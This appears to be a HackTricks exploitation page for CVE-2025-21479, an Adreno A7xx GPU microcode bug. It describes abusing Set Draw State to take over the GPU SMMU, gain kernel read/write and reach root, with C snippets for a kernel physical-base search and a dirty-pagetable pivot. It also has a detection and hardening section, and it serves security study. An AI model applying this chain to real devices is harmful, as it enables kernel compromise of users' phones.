# Adreno A7xx SDS->RB privilege bypass (GPU SMMU takeover to Kernel R/W)

{{#include ../../banners/hacktricks-training.md}}

This page abstracts an in-the-wild Adreno A7xx microcode logic bug (CVE-2025-21479) into reproducible exploitation techniques: abusing IB-level masking in Set Draw State (SDS) to execute privileged GPU packets from an unprivileged app, pivoting to GPU SMMU takeover and then to a fast, stable kernel R/W via a dirty-pagetable trick.

- Affected: Qualcomm Adreno A7xx GPU firmware prior to a microcode fix that changed masking of register $12 from 0x3 to 0x7.
- Primitive: Execute privileged CP packets (e.g., CP_SMMU_TABLE_UPDATE) from SDS, which is user-controlled.
- Outcome: Arbitrary physical/virtual kernel memory R/W, SELinux disable, root.
- Prereq: Ability to create a KGSL GPU context and submit command buffers that enter SDS (normal app capability).

## Background: IB levels, SDS and the $12 mask

- The kernel maintains a ringbuffer (RB=IB0). Userspace submits IB1 via CP_INDIRECT_BUFFER, chaining to IB2/IB3.
- SDS is a special command stream entered via CP_SET_DRAW_STATE:
  - A6xx: SDS is treated as IB3
  - A7xx: SDS moved to IB4
- Microcode tracks the current IB level in register $12 and gates privileged packets so they are only accepted when the effective level corresponds to IB0 (kernel RB).
- Bug: A7xx microcode kept masking $12 with 0x3 (2 bits) instead of 0x7 (3 bits). Since IB4 & 0x3 == 0, SDS was misidentified as IB0, allowing privileged packets from user-controlled SDS.

Why it matters:

```
A6XX                | A7XX
RB  & 3       == 0  |  RB  & 3       == 0
IB1 & 3       == 1  |  IB1 & 3       == 1
IB2 & 3       == 2  |  IB2 & 3       == 2
IB3 (SDS) & 3 == 3  |  IB3 & 3       == 3
                    |  IB4 (SDS) & 3 == 0   <-- misread as IB0 if mask is 0x3
```

Microcode diff example (patch switched the mask to 0x7):

```
@@ CP_SMMU_TABLE_UPDATE
- and $02, $12, 0x3
+ and $02, $12, 0x7
@@ CP_FIXED_STRIDE_DRAW_TABLE
- and $02, $12, 0x3
+ and $02, $12, 0x7
```

## Exploitation overview

Goal: From SDS (misread as IB0) issue privileged CP packets to re-point the GPU SMMU to attacker-crafted page tables, then use GPU copy/write packets for arbitrary physical R/W. Finally, pivot to a fast CPU-side R/W via dirty pagetable.

High-level chain
- Craft a fake GPU pagetable in shared memory
- Enter SDS and execute:
  - CP_SMMU_TABLE_UPDATE -> switch to fake pagetable
  - CP_MEM_WRITE / CP_MEM_TO_MEM -> implement write/read primitives
  - CP_SET_DRAW_STATE with run-now flags (dispatch immediately)

GPU R/W primitives via fake pagetable
- Write: CP_MEM_WRITE to an attacker-chosen GPU VA whose PTEs you map to a chosen PA -> arbitrary physical write
- Read: CP_MEM_TO_MEM copies 4/8 bytes from target PA to a userspace-shared buffer (batch for larger reads)

Notes
- Each Android process gets a KGSL context (IOCTL_KGSL_GPU_CONTEXT_CREATE). Switching contexts normally updates SMMU tables in the RB; the bug lets you do it in SDS.
- Excessive GPU traffic can cause UI blackouts and reboots; reads are small (4/8B) and sync is slow by default.

## Building the SDS command sequence

- Spray a fake GPU pagetable into shared memory so at least one instance lands at a known physical address (e.g., via allocator grooming and repetition).
- Construct an SDS buffer containing, in order:
  1) CP_SMMU_TABLE_UPDATE to the physical address of the fake pagetable
  2) One or more CP_MEM_WRITE and/or CP_MEM_TO_MEM packets to implement R/W using your new translations
  3) CP_SET_DRAW_STATE with flags to run-now

The exact packet encodings vary by firmware; use freedreno’s afuc/packet docs to assemble the words, and ensure the SDS submission path is taken by the driver.

## Finding Samsung kernel physbase under physical KASLR

Samsung randomizes the kernel physical base within a known region on Snapdragon devices. Brute-force the expected range and look for the first 16 bytes of _stext.

Representative loop

```c
while (!ctx->kernel.pbase) {
  offset += 0x8000;
  uint64_t d1 = kernel_physread_u64(ctx, base + offset);
  if (d1 != 0xd10203ffd503233f) continue;   // first 8 bytes of _stext
  uint64_t d2 = kernel_physread_u64(ctx, base + offset + 8);
  if (d2 == 0x910083fda9027bfd) {           // second 8 bytes of _stext
    ctx->kernel.pbase = base + offset - 0x10000;
    break;
  }
}
```

Once physbase is known, compute the kernel virtual with the linear map:

```
_stext = 0xffffffc008000000 + (Kernel Code & ~0xa8000000)
```

## Stabilizing to fast, reliable CPU-side kernel R/W (dirty pagetable)

GPU R/W is slow and small-granularity. Pivot to a fast/stable primitive by corrupting your own process PTEs (“dirty pagetable”):

Steps
- Locate current task_struct -> mm_struct -> mm_struct->pgd using the slow GPU R/W primitives
- mmap two adjacent userspace pages A and B (e.g., at 0x1000)
- Walk PGD->PMD->PTE to resolve A/B’s PTE physical addresses (helpers: get_pgd_offset, get_pmd_offset, get_pte_offset)
- Overwrite B’s PTE to point to the last-level pagetable managing A/B with RW attributes (phys_to_readwrite_pte)
- Write via B’s VA to mutate A’s PTE to map target PFNs; read/write kernel memory via A’s VA, flushing TLB until a sentinel flips

<summary>Example dirty-pagetable pivot snippet</summary>

```c
uint64_t *map = mmap((void*)0x1000, PAGE_SIZE*2, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
uint64_t *page_map = (void*)((uint64_t)map + PAGE_SIZE);
page_map[0] = 0x4242424242424242;

uint64_t tsk = get_curr_task_struct(ctx);
uint64_t mm = kernel_vread_u64(ctx, tsk + OFFSETOF_TASK_STRUCT_MM);
uint64_t mm_pgd = kernel_vread_u64(ctx, mm + OFFSETOF_MM_PGD);

uint64_t pgd_off = get_pgd_offset((uint64_t)map);
uint64_t phys_pmd = kernel_vread_u64(ctx, mm_pgd + pgd_off) & ~((1<<12)-1);
uint64_t pmd_off = get_pmd_offset((uint64_t)map);
uint64_t phys_pte = kernel_pread_u64(ctx, phys_pmd + pmd_off) & ~((1<<12)-1);
uint64_t pte_off = get_pte_offset((uint64_t)map);
uint64_t pte_addr = phys_pte + pte_off;
uint64_t new_pte = phys_to_readwrite_pte(pte_addr);
kernel_write_u64(ctx, pte_addr + 8, new_pte, false);
while (page_map[0] == 0x4242424242424242) flush_tlb();
```

## Detection and hardening

- Firmware/microcode: fix all sites masking $12 to use 0x7 (A7xx) and audit privileged packet gates
- Driver: validate effective IB level for privileged packets and enforce per-context allowlists
- Telemetry: alert if CP_SMMU_TABLE_UPDATE (or similar privileged opcodes) appears outside RB/IB0, especially in SDS; monitor anomalous bursts of 4/8-byte CP_MEM_TO_MEM and excessive TLB flush patterns
- Kernel: harden pagetable metadata and detect user PTE corruption patterns

## Impact

A local app with GPU access can execute privileged GPU packets, hijack the GPU SMMU, achieve arbitrary kernel physical/virtual R/W, disable SELinux and obtain root on affected Snapdragon A7xx devices (e.g., Samsung S23). Severity: High (kernel compromise).
